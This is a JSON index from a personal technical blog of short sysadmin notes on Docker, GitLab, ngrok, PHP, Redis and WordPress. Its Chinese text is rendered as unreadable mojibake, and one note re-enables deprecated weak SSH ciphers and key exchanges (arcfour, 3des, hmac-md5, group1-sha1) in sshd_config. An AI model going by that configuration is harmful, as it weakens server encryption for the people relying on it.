â€”prefix=/usr/local/privoxy/ adduser privoxy make &amp;&amp; make install ä¿®æ”¹é…ç½®:# vim /usr/local/privoxy/etc/config å¢åŠ ä¸€è¡Œ forward-socks5 / 127.0.0.1:1080 . # åé¢æœ‰ä¸ªç‚¹ å¦åˆ™ä¼šæŠ¥é”™ Error: Wrong number of parameters for forward-socks4a directive in configuration file. å¯åŠ¨ /usr/local/privoxy/sbin/privoxy /usr/local/privoxy/etc/config","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"docker ç¦»çº¿å®‰è£…","slug":"history/tech/5a05aeb20e68a3670593cc6e","date":"2017-11-10T01:50:42.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/5a05aeb20e68a3670593cc6e/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a05aeb20e68a3670593cc6e/","excerpt":"","text":"ä¸‹è½½åœ°å€:https://download.docker.com/linux/static/stable/x86_64/ è§£å‹å:cp docker/* /usr/bin/ è¿è¡ŒæœåŠ¡:dockerd &amp; æµ‹è¯•:sudo docker run hello-world æ·»åŠ  docker ç»„:sudo groupadd docker å°†ç”¨æˆ·æ·»åŠ åˆ°dockerç»„ä¸­ï¼šsudo usermod -aG docker $USER","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"ubuntu serviceçš„æ·»åŠ å’Œåˆ é™¤","slug":"history/tech/5a05ae820e68a3670593cc6d","date":"2017-11-10T01:49:54.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/5a05ae820e68a3670593cc6d/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a05ae820e68a3670593cc6d/","excerpt":"","text":"æ·»åŠ ä¸€ä¸ªæœåŠ¡:update-rc.d ServiceName defaults åˆ é™¤ä¸€ä¸ªæœåŠ¡:update-rc.d ServiceName remove","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"k8s èµ„æ–™","slug":"history/tech/5a057bc50e68a3670593cc6c","date":"2017-11-09T22:13:25.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/5a057bc50e68a3670593cc6c/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a057bc50e68a3670593cc6c/","excerpt":"","text":"ä¸­æ–‡æ–‡æ¡£:https://www.kubernetes.org.cn","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"linux windows å‘½ä»¤è¡Œè®¡ç®—æ–‡ä»¶ MD5","slug":"history/tech/5a0555b10e68a3670593cc6b","date":"2017-11-09T19:30:57.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/5a0555b10e68a3670593cc6b/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a0555b10e68a3670593cc6b/","excerpt":"","text":"linux:md5sum kubernetes.tar.gz windows:certutil -hashfile kubernetes.tar.gz MD5 certutil -hashfile kubernetes.tar.gz SHA1 certutil -hashfile kubernetes.tar.gz SHA256","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"gitlab å¤‡ä»½æ¢å¤","slug":"history/tech/5a05482f0e68a3670593cc6a","date":"2017-11-09T18:33:19.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/5a05482f0e68a3670593cc6a/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a05482f0e68a3670593cc6a/","excerpt":"","text":"åˆ›å»ºå¤‡ä»½:gitlab-rake gitlab:backup:create æ¢å¤ï¼š# åœæ­¢ç›¸å…³æ•°æ®è¿æ¥æœåŠ¡ gitlab-ctl stop unicorn gitlab-ctl stop sidekiq ä»1393513186ç¼–å·å¤‡ä»½ä¸­æ¢å¤gitlab-rake gitlab:backup:restore BACKUP=1393513666 å¯åŠ¨Gitlabsudo gitlab-ctl start","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"docker run volume  å’Œ publish å‚æ•°","slug":"history/tech/5a045b8d0ef83fdf30bef581","date":"2017-11-09T01:43:41.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/5a045b8d0ef83fdf30bef581/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a045b8d0ef83fdf30bef581/","excerpt":"","text":"å‘½ä»¤å¦‚ä¸‹sudo docker run \\ --publish ä¸»æœºç«¯å£:å®¹å™¨ç«¯å£ \\ --volume ä¸»æœºç›®å½•:å®¹å™¨ç›®å½• \\ gitlab/gitlab-ce:latest","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"There was an error while trying to load the gem 'uglifier'.","slug":"history/tech/5a0418980ef83fdf30bef580","date":"2017-11-08T20:58:00.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/5a0418980ef83fdf30bef580/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a0418980ef83fdf30bef580/","excerpt":"","text":"åŸå› :ç¼ºå°‘ nodejsè§£å†³:ln -s /usr/local/node/bin/node /usr/bin/node","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"æ‰“åŒ…git æ£€å‡ºçš„åŒ…å«éšè—æ–‡ä»¶çš„ç›®å½•","slug":"history/tech/5a04184f0ef83fdf30bef57f","date":"2017-11-08T20:56:47.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/5a04184f0ef83fdf30bef57f/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a04184f0ef83fdf30bef57f/","excerpt":"","text":"å‘½ä»¤å¦‚ä¸‹:tar -czvf gitlab.tar.gz ./gitlab/* ./gitlab/.[!.]*","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"ngrok","slug":"history/tech/5a031d452072bfd4054686a6","date":"2017-11-08T03:05:41.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/5a031d452072bfd4054686a6/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a031d452072bfd4054686a6/","excerpt":"","text":"ç”Ÿæˆè¯ä¹¦NGROK_DOMAIN=&quot;qianrushi.org&quot; openssl genrsa -out base.key 2048 openssl req -new -x509 -nodes -key base.key -days 10000 -subj &quot;/CN=$NGROK_DOMAIN&quot; -out base.pem openssl genrsa -out server.key 2048 openssl req -new -key server.key -subj &quot;/CN=$NGROK_DOMAIN&quot; -out server.csr openssl x509 -req -in server.csr -CA base.pem -CAkey base.key -CAcreateserial -days 10000 -out server.crt cp base.pem assets/client/tls/ngrokroot.crt cp server.crt /root/ngrok/assets/client/tls/snakeoilca.crt sudo GOOS=linux GOARCH=arm make release-server release-client sudo GOOS=linux GOARCH=amd64 make release-server release-client æœåŠ¡ç«¯ supervisorè„šæœ¬[program:ngrok] command=/usr/local/bin/ngrokd -tlsKey=&quot;/usr/local/ngrok/keys/server.key&quot; -log-level=INFO -tlsCrt=&quot;/usr/local/ngrok/keys/server.crt&quot; -domain=&quot;qianrushi.org&quot; -httpAddr=&quot;:30001&quot; -httpsAddr=&quot;&quot; autostart=true autorestart=true user=root å®¢æˆ·ç«¯ ngrok.ymltCrtPaths: &quot;/usr/local/ngrok/certs/ngrokroot.crt&quot; server_addr: &quot;qianrushi.org:4443&quot; trust_host_root_certs: false tunnels: ssh: remote_port: 60000 proto: tcp: 22 web: subdomain: &quot;search&quot; proto: http: localhost:80 å®¢æˆ·ç«¯ supervisor è„šæœ¬[program:ngrok] command=/usr/local/bin/ngrok -config=/usr/local/ngrok/conf.d/ngrok.yml start ssh autostart=true autorestart=true user=root","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"èŒƒæ•°","slug":"history/math/5a02d1be2072bfd4054686a5","date":"2017-11-07T21:43:26.000Z","updated":"2020-11-29T01:42:08.743Z","comments":true,"path":"history/math/5a02d1be2072bfd4054686a5/","link":"","permalink":"https://wangxiuwen.github.io/history/math/5a02d1be2072bfd4054686a5/","excerpt":"","text":"ä»€ä¹ˆæ˜¯èŒƒæ•°ï¼Ÿæˆ‘ä»¬çŸ¥é“è·ç¦»çš„å®šä¹‰æ˜¯ä¸€ä¸ªå®½æ³›çš„æ¦‚å¿µï¼Œåªè¦æ»¡è¶³éè´Ÿã€è‡ªåã€ä¸‰è§’ä¸ç­‰å¼å°±å¯ä»¥ç§°ä¹‹ä¸ºè·ç¦»ã€‚èŒƒæ•°æ˜¯ä¸€ç§å¼ºåŒ–äº†çš„è·ç¦»æ¦‚å¿µï¼Œå®ƒåœ¨å®šä¹‰ä¸Šæ¯”è·ç¦»å¤šäº†ä¸€æ¡æ•°ä¹˜çš„è¿ç®—æ³•åˆ™ã€‚æœ‰æ—¶å€™ä¸ºäº†ä¾¿äºç†è§£ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠèŒƒæ•°å½“ä½œè·ç¦»æ¥ç†è§£ã€‚åœ¨æ•°å­¦ä¸Šï¼ŒèŒƒæ•°åŒ…æ‹¬å‘é‡èŒƒæ•°å’ŒçŸ©é˜µèŒƒæ•°ï¼Œå‘é‡èŒƒæ•°è¡¨å¾å‘é‡ç©ºé—´ä¸­å‘é‡çš„å¤§å°ï¼ŒçŸ©é˜µèŒƒæ•°è¡¨å¾çŸ©é˜µå¼•èµ·å˜åŒ–çš„å¤§å°ã€‚ä¸€ç§éä¸¥å¯†çš„è§£é‡Šå°±æ˜¯ï¼Œå¯¹åº”å‘é‡èŒƒæ•°ï¼Œå‘é‡ç©ºé—´ä¸­çš„å‘é‡éƒ½æ˜¯æœ‰å¤§å°çš„ï¼Œè¿™ä¸ªå¤§å°å¦‚ä½•åº¦é‡ï¼Œå°±æ˜¯ç”¨èŒƒæ•°æ¥åº¦é‡çš„ï¼Œä¸åŒçš„èŒƒæ•°éƒ½å¯ä»¥æ¥åº¦é‡è¿™ä¸ªå¤§å°ï¼›å¯¹äºçŸ©é˜µèŒƒæ•°ï¼Œå­¦è¿‡çº¿æ€§ä»£æ•°ï¼Œæˆ‘ä»¬çŸ¥é“ï¼Œé€šè¿‡è¿ç®—AX=Bï¼Œå¯ä»¥å°†å‘é‡Xå˜åŒ–ä¸ºBï¼ŒçŸ©é˜µèŒƒæ•°å°±æ˜¯æ¥åº¦é‡è¿™ä¸ªå˜åŒ–å¤§å°çš„ã€‚èŒƒæ•°ç†è®ºçš„ä¸€ä¸ªå°æ¨è®ºå‘Šè¯‰æˆ‘ä»¬ï¼šâ„“1â‰¥â„“2â‰¥â„“âˆ","categories":[{"name":"æ•°å­¦","slug":"æ•°å­¦","permalink":"https://wangxiuwen.github.io/categories/%E6%95%B0%E5%AD%A6/"}],"tags":[{"name":"math","slug":"math","permalink":"https://wangxiuwen.github.io/tags/math/"},{"name":"æ•°å­¦","slug":"æ•°å­¦","permalink":"https://wangxiuwen.github.io/tags/%E6%95%B0%E5%AD%A6/"}],"author":"wangxiuwen"},{"title":"bfgminer","slug":"history/tech/5a0107ca2072bfd4054686a4","date":"2017-11-07T01:09:30.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/5a0107ca2072bfd4054686a4/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a0107ca2072bfd4054686a4/","excerpt":"","text":"ubuntu ç¼–è¯‘ä¾èµ–é…ç½®:sudo apt-get install autoconf libtool libncurses-dev yasm curl libcurl4-openssl-dev libjansson-dev pkg-config libudev-dev uthash-dev libusb-dev libevent-dev","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"wordpress æŠ¥é”™ Call to undefined function gzinflate()","slug":"history/tech/5a003b52f2232a8203367ce7","date":"2017-11-05T22:37:06.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/5a003b52f2232a8203367ce7/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a003b52f2232a8203367ce7/","excerpt":"","text":"æŠ¥é”™ä¿¡æ¯:Call to undefined function gzinflate()","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"ubuntu 17.10 Uç›˜å®‰è£…","slug":"history/tech/5a00356ff2232a8203367ce6","date":"2017-11-05T22:11:59.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/5a00356ff2232a8203367ce6/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a00356ff2232a8203367ce6/","excerpt":"","text":"å®˜æ–¹è¯´æ˜é¡µé¢:https://help.ubuntu.com/community/Installation/FromUSBStickQuickå®‰è£…å™¨:https://rufus.akeo.ie/","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"elasticsearch 5.6.3 å¯åŠ¨æŠ¥é”™","slug":"history/tech/59fe7e4120ed3d0209ab4de5","date":"2017-11-05T02:58:09.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/59fe7e4120ed3d0209ab4de5/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/59fe7e4120ed3d0209ab4de5/","excerpt":"","text":"æŠ¥é”™ä¿¡æ¯:ERROR: [1] bootstrap checks failed ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼Œå¢åŠ :# config/elasticsearch.yml transport.host: localhost","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"æœºå™¨å­¦ä¹ æ•°æ®é›†åˆ†ç±»","slug":"history/tech/59fd7faf20ed3d0209ab4de4","date":"2017-11-03T20:51:59.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/59fd7faf20ed3d0209ab4de4/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/59fd7faf20ed3d0209ab4de4/","excerpt":"","text":"å°†æ•°æ®åˆ†ç±»:trainning set hold out validation set(development set) test set(ä¸ºäº†æ— åè¯„ä¼°ç®—æ³•çš„è¿è¡Œæƒ…å†µ) å°æ•°æ®æ—¶ä»£:trainning set: 70% test set: 30% å¦‚æœæ²¡æœ‰æ˜ç¡®è®¾ç½®éªŒè¯é›†, ä¹Ÿå¯ä»¥æŒ‰ç…§:trainning set: 60% dev set: 20% test set: 20% ç°åœ¨éªŒè¯é›†å’Œæµ‹è¯•é›†çš„æ¯”ä¾‹æœ‰å˜å°çš„è¶‹åŠ¿ã€‚æ¯”å¦‚è¯´æœ‰ 1,000,000 æ¡æ•°æ®ï¼Œ æ‹¿å‡º 10,000 æ¡åšä¸ºéªŒè¯é›†ï¼Œ 10,000 ä½œä¸ºæµ‹è¯•é›†å³å¯ã€‚å¦‚æœä¸éœ€è¦æ— åè¯„ä¼°ï¼Œ å¯ä»¥ä¸è¦ test setï¼Œ è¿™æ—¶å€™ dev set è¢«ç§°ä¸º test setï¼Œ è¿™æ—¶å€™å…¶å®æ˜¯æŠŠ dev set çš„æ•°æ®è¿‡æ‹Ÿåˆåˆ°äº† tranning set ä¸­ã€‚å´æ©è¾¾æŠŠè¿™ç§å«åš â€œè®­ç»ƒéªŒè¯é›†â€ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"supervisor å†…å­˜é™åˆ¶","slug":"history/tech/59fc672a20ed3d0209ab4de3","date":"2017-11-03T00:55:06.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/59fc672a20ed3d0209ab4de3/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/59fc672a20ed3d0209ab4de3/","excerpt":"","text":"https://superlance.readthedocs.io/en/latest/","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"linux åˆ›å»º swap åˆ†åŒº","slug":"history/tech/59fc2f658cb3a6b90388bedb","date":"2017-11-02T20:57:09.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/59fc2f658cb3a6b90388bedb/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/59fc2f658cb3a6b90388bedb/","excerpt":"","text":"åˆ›å»ºå¹¶æ¿€æ´»æ–‡ä»¶:sudo dd if=/dev/zero of=/data/swapfile bs=1024 count=4066544 sudo mkswap swapfile //mkswapæ˜¯åœ¨é‚£ä¸ªç©ºç™½æ–‡ä»¶çš„åŸºç¡€ä¸Š,å»ºç«‹swapçš„æ–‡ä»¶ç³»ç»Ÿ sudo swapon swapfile //æ¿€æ´»swapæ–‡ä»¶ ä¿®æ”¹fstab:#etc/fstab /data/swapfile swap swap defaults 0 0","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"MISCONF Redis is configured to save RDB snapshots","slug":"history/tech/59fc2ed08cb3a6b90388beda","date":"2017-11-02T20:54:40.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/59fc2ed08cb3a6b90388beda/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/59fc2ed08cb3a6b90388beda/","excerpt":"","text":"è§£å†³:config set stop-writes-on-bgsave-error no å‚è€ƒ:http://blog.csdn.net/song19890528/article/details/38536871","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"navicat è¿æ¥ mysql æŠ¥é”™","slug":"history/tech/59fc2da48cb3a6b90388bed9","date":"2017-11-02T20:49:40.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/59fc2da48cb3a6b90388bed9/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/59fc2da48cb3a6b90388bed9/","excerpt":"","text":"æŠ¥é”™:SSH Tunnel: Server does not support diffie-hellman-group1-sha1 for keyexchange åŸå› :SharpSSHæˆ–JSCHä½¿ç”¨diffie-hellman-group1-sha1å’Œdiffie-hellman-group-exchange-sha1å¯†é’¥äº¤æ¢ç®—æ³•ï¼Œè€ŒOpenSSHåœ¨6.7p1ç‰ˆæœ¬ä¹‹åé»˜è®¤ä¸å†é‡‡ç”¨ä»¥ä¸Šç®—æ³•ï¼Œéœ€è¦æ‰‹å·¥æ·»åŠ ã€‚ è§£å†³:# /etc/ssh/sshd_config Ciphers aes128-cbc,aes192-cbc,aes256-cbc,aes128-ctr,aes192-ctr,aes256-ctr,3des-cbc,arcfour128,arcfour256,arcfour,blowfish-cbc,cast128-cbc MACs hmac-md5,hmac-sha1,umac-64@openssh.com,hmac-ripemd160,hmac-sha1-96,hmac-md5-96 KexAlgorithms diffie-hellman-group1-sha1,diffie-hellman-group14-sha1,diffie-hellman-group-exchange-sha1,diffie-hellman-group-exchange-sha256,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group1-sha1,curve25519-sha256@libssh.org é‡å¯sshdæœåŠ¡:service sshd restart","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"æŸ¥çœ‹phpå·²å®‰è£…æ‰©å±•å‘½ä»¤","slug":"history/tech/59fc2ca88cb3a6b90388bed8","date":"2017-11-02T20:45:28.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/59fc2ca88cb3a6b90388bed8/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/59fc2ca88cb3a6b90388bed8/","excerpt":"","text":"å‘½ä»¤:php -m","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"php ç¼–è¯‘å®‰è£…","slug":"history/tech/59fc2c8c8cb3a6b90388bed7","date":"2017-11-02T20:45:00.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/59fc2c8c8cb3a6b90388bed7/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/59fc2c8c8cb3a6b90388bed7/","excerpt":"","text":"php æŠ¥é”™:checking for xml2-config path... configure: error: xml2-config not found. Please check your libxml2 installation. è§£å†³:apt install libxml2 apt install libxml2-dev ç¼–è¯‘å®‰è£… zlib(wordpress æŠ¥é”™ Call to undefined function gzinflate(), ç‰¹ç¼–è¯‘æ­¤é¡¹)ï¼š#https://zlib.net/ wget https://zlib.net/zlib-1.2.11.tar.gz ./configure --prefix=/mnt/apps/zlib make make install ç¼–è¯‘:./configure --prefix=/mnt/apps/php7 --enable-fpm --with-pdo-mysql --with-mysqli --with-zlib-dir=/mnt/apps/zlib make make install","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"wordpress ä¿®æ”¹è¡¨å‰ç¼€","slug":"history/tech/59fc2c168cb3a6b90388bed6","date":"2017-11-02T20:43:02.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/59fc2c168cb3a6b90388bed6/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/59fc2c168cb3a6b90388bed6/","excerpt":"","text":"ä¿®æ”¹é…ç½®æ–‡ä»¶# wp-config.php $table_prefix = 'work_'; æŒ¨ä¸ªä¿®æ”¹è¡¨å:RENAME table `w_commentmeta` TO `work_commentmeta`; ä¿®æ”¹è¡¨å†…å®¹update work_options set option_name = replace(option_name,'work','work_'); update work_usermeta set meta_key = replace(meta_key,'work','work_');","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"åŒºå—é“¾èµ„æ–™","slug":"history/tech/59fa821d29daf38b68d15485","date":"2017-11-02T02:25:33.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/59fa821d29daf38b68d15485/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/59fa821d29daf38b68d15485/","excerpt":"","text":"åŒºå—é“¾æŠ€æœ¯æŒ‡å—(åŒºå—é“¾åŸç†ã€è®¾è®¡ä¸åº”ç”¨)Node.jså¼€å‘åŠ å¯†è´§å¸Sawtooth LakeHyperledger Fabric","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"é…ç½® jupyter 